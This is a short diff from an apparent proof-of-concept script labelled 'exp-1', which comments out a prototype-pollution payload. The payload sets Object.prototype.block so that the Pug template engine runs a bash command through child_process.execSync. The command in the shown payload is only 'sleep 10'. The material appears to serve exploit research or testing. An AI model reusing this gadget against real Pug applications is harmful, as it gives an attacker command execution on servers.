@@ -4,10 +4,10 @@ pug = require("pug")
 // inject property to root prototype
 
 // exp-1
-Object.prototype.block = {
-    type: "Text",
-    line: "process.mainModule.require('child_process').execSync(`bash -c 'sleep 10'`)"
-}
+// Object.prototype.block = {
+//     type: "Text",
+//     line: "process.mainModule.require('child_process').execSync(`bash -c 'sleep 10'`)"
+// }
 
 // exp-2
 // Object.prototype['block'] = { 
